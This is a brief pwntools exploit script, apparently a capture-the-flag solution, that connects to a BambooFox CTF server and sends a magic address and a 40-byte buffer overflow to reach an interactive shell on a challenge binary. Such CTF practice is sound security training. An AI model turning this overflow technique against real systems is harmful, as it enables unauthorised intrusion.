#!/usr/bin/env python

from pwn import *

r = remote('bamboofox.cs.nctu.edu.tw', 22007)
# r = process('./overflow')

magic = 0x80486ad

r.recvuntil('?')
r.sendline(str(magic))

r.recvuntil('!!!')
r.sendline('a' * 40)

r.interactive()
